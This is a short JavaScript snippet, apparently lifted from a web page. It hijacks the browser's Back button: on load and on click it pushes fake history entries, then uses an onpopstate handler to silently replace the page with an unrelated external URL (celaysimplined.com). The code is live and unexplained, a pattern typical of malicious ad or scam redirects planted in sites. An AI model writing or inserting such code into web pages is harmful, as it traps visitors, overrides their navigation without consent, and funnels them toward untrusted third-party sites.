
                            function bbscriptOnClick() {
                                history['pushState'](null, null, '#'), window['onpopstate'] = function (a) {
                                    a['state'] !== null ? (document['title'] = a['state']['title'], load(a['state']['url'])) : location['replace']('https://celaysimplined.com/9b16c6b8-c555-43fe-b5d4-db0a96af8303');
                                };
                            }
                            document['addEventListener']('DOMContentLoaded', () => history['pushState'](null, null, '#'));
                        